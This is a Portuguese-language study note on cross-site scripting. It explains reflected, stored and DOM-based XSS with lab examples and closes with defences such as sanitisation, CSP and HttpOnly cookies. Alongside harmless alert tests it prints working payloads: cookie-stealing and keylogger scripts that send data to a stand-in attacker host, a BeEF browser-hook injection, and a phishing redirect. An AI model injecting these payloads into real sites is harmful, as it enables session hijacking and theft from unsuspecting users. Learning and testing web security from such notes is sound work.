2025-06-28 09:37

Status: #developed #segurança 

Tags: [[CyberSecurity]] | [[XSS]]

----
# Introdução

***Cross-Site Scripting* (XSS)** é uma vulnerabilidade de segurança que permite a uma atacante injetar scripts maliciosos (geralmente JavaScript) em páginas web acessadas por outros usuários. Esses scripts são executados no navegador da vítima, podendo roubar cookies, sessões, redirecionar para sites maliciosos ou até mesmo controlar a aplicação.

## Por que o XSS é Perigoso?

- Pode **roubar credenciais de login** (cookies, tokens).
- Permite **sequestro de sessões** (session hijacking).
- Pode **modificar conteúdo da página** (phishing).
- Pode **redirecionar para sites maliciosos**.

---
# Tipos de XSS

## 1. XSS Refletido *(Reflected XSS)*

![[Pasted image 20250628095826.png]]

- O script malicioso é **incluído na URL** e refletido na resposta do servidor.
- Requer que a vítima clique em um link manipulado.
- **Exemplo:**

```url
http://exemplo.com/search?q=<script>alert('XSS')</script>
```

- Se o site não sanitizar a entrada, o scrip será executado.

### Exemplo Prático

Dentro de uma caixa de busca, pode ser digitado o seguinte script de caixa de alerta:

```xml
<script>alert(1)</script>
```

É possível observar que houve uma mudança na URL e irá surgir uma caixa de alerta com o número `1`, assim o script for inserido no campo de busca.

![[Pasted image 20250628105056.png]]

Este tipo de ataque **XSS Refletido** apenas funciona na máquina do atacante. Caso queria que outro usuário veja a página com script é preciso copiar a URL e encaminhá-la para outra pessoa acessar. Isso ocorre comumente em ataques de *phishing.*

## 2. XSS Armazenado *(Stored XSS)*

![[Pasted image 20250628094634.png]]

- O scrip é **armazenado no servidor** (ex: banco de dados) e executado sempre que a página é acessada.
- Afeta todos os usuários que visualizam o conteúdo comprometido
- **Exemplo:**

```html
<script>fetch('https://atacante.com/steal?cookie='+document.cookie)</script>
```

- Se postado em um fórum, rouba cookies de quem visualizar.

### Exemplo Prático

Ao acessar uma campo de postagem de comentários é possível inserir o seguinte comando:

```xml
<script>alert(1)</script>
```

Ao sair da página de postagem e retornar é possível ver a caixa de alerta com o número `1`.

Isso indica que o script ficou salvo dentro do servidor da página, e toda vez que aquela página for acessada, mesmo que por outro usuário, o script de alerta será exibido.

Também é possível colocar outros tipos de scripts, como por exemplo:

```html
<script>
	document.body.innerHTML="";
	var imagem=new Image();
	imagem.src="https://img.freepik.com/vetores-gratis/rosquinhas-vitrificadas-coloridas-fugindo-em-panico-ilustracao-de-desenho-animado_74855-17017.jpg";
	document.body.appendChild(imagem);
</script>
```

Com ele, é possível inserir no servidor um scrip que altera toda a página do post para branco e adiciona uma imagem da web.

Neste ataque de **XSS Persistente ou Armazenado**, o script é colocado é armazenado no banco de dados e todos os outros usuários que acessarem a página vão ver o script.
## 3. XSS Baseado em DOM *(DOM-Based XSS)*

![[Pasted image 20250628100011.png]]

- O ataque ocorre **inteiramente no navegador**, sem enviar dados maliciosos ao servidor.
- Explora manipulação do ***Document Object Model* (DOM)**.
- **Exemplo:**

```javascript
document.write('<img src="x" onerror="alert(\'XSS\')">');
```

- Se o site usar `document.write` sem sanitização, o código é executado.

### Exemplo prático:

Em um caixa de busca pode ser digitado o seguinte script:

```xml
"><svg onload=alert(1)> //
```

Desta forma irá surgir uma caixa de alerta com o número 1.

![[Pasted image 20250628104548.png]]

Isso foi possível porque ao pesquisar um termo de busca e encontrá-lo no código HTML de ferramenta de inspecionar a página, ele pode ser encontrada em uma tag `<img>`:

```xml
<img src="/resources/images/tracker.gif?searchTerms=termo-de-busca">
```

Nesse caso, dentro da caixa de busca, pode ser forçado o fechamento da tag `<img>` e abrir outra com algum script, como o de caixa de alerta, tornando no seguinte:

```xml
<img src="/resources/images/tracker.gif?searchTerms="><svg onload=alert(1)> //
">
```

E com isso, é possível explorar a vulnerabilidade de **XSS Baseada em DOM**, ela se diferencia dos outros tipos de XSS porque o ataque, nesse caso, acontece apenas no navegador do cliente sem que nenhum parâmetro seja enviado ao servidor.

---
# Como Funciona o Ataque XSS?

## Passos de um Ataque XSS?

1. **Injeção:** O atacante insere um scrip malicioso em um campo vulnerável (URL, formulário, comentário).
2. **Armazenamento (se *Stored XSS*):** O script é salvo no banco de dados.
3. **Execução:** Quando a vítima acessa a página, o script roda em seu navegador.
4. **Ataque:** O script pode:
	- Roubar cookies (`document.cookie`).
	- Redirecionar para um site falso (`window.location`).
	- Registrar teclas pressionadas (*keylogger*)

## Exemplo de Payloads XSS Comuns

- **Alerta Simples:**

```html
<script>alert('XSS')</script>
```

- **Roubo de Cookies:**

```html
<script>fetch('http://atacante.com/steal?cookie=' + document.cookie)</script>
```

- **Redirecionamento:**

```html
<script>window.location='http://phishing.com'</script>
```

- ***Keylogger*:**

```javascript
document.onkeypress = function(e) { fetch('http://atacante.com/log?key=' + e.key) };
```

---
# Ferramentas para Detecção e Exploração de XSS

## Ferramentas Automatizadas

| **Ferramenta** | **Descrição**                                                       |
| -------------- | ------------------------------------------------------------------- |
| Burp Suite     | Scanner de segurança para testar XSS manualmente e automaticamente. |
| OWASP ZAP      | Ferramenta gratuita para encontrar vulnerabilidades XSS.            |
| XSStrike       | Scanner avançado de XSS que ignora WAFs.                            |
| BeEF           | Explora XSS para controle remota de navegadores.                    |

## Comandos com SQLmap (para XSS indireto)

Se um XSS permitir roubo de cookies via SQL Injection:

```bash
sqlmap -u "http://exemplo.com/search?q=<script>alert(1)</script>" --crawl=1
```

---
# Como Explorar XSS? (Exemplo Prático)

## 1. Testando um Campo de Pesquisa para XSS Refletido

1. Insira um payload básico:

```html
<script>alert('XSS')</script>
```

2. Se aparecer um pop-up, o site é vulnerável.

## 2. Explorando XSS Armazenado em um Fórum

1. Poste um comentário com:

```html
<img src="x" onerror="fetch('http://atacante.com/steal?cookie='+document.cookie)">
```

2. Quando um moderador visualizar, seu cookie será enviado ao atacante.

## 3. Usando BeEF para Controle de Navegador

1. Inicie o BeEF:

```bash
beef-xss
```

2. Injeto o hook:

```html
<script src="http://IP_DO_ATACANTE:3000/hook.js"></script>
```

3. Quando a vítima executar, você terá controle via BeEF.

---
# Como se Proteger Contra XSS?

## Defesas Recomendadas

✅ **Sanitização de Entrada:**

- Usando funções como `htmlspecialchars()` (PHP) ou `DOMPurify` (JavaScript).
	 ✅ **Content Security Policy (CSP):**
	- Restringe scripts externos:

```http
Content-Security-Policy: default-src 'self'
```

✅ **HTTP Only e Secure Flags em Cookies:**

- Impede roubo via JavaScript:

```http
Set-Cookie: sessao=123; HttpOnly; Secure
```

✅ **Validação de Dados**

- Bloqueie tags `<script>`, `onerror=`, `javascript:` em formulários.

---
# Exemplo de Código Vulnerável vs Correto

## Código Vulnerável (PHP)

```php
<?php
$comentario = $_POST['comentario'];
echo "<div>" . $comentario. "</div>"; // XSS possível
?>
```

- Se o usuário inserir `<script>malware()</script>`, será executado.

## Código Protegido (PHP)

```php
<?php
$comentario = htmlspecialchars($_POST['comentario'], ENT_QUOTES, 'UTF-8');
echo "<div>" . $comentario. "</div>";  // Seguro
?>
```

- Converte `<script>` em `&lt; script&gt;`, impedindo execução.

---
# Conclusão

O XSS é uma das vulnerabilidades mais comuns e perigosas em aplicações web. Entender seus tipos, métodos de exploração e prevenção é essencial para desenvolvedores e pentesters.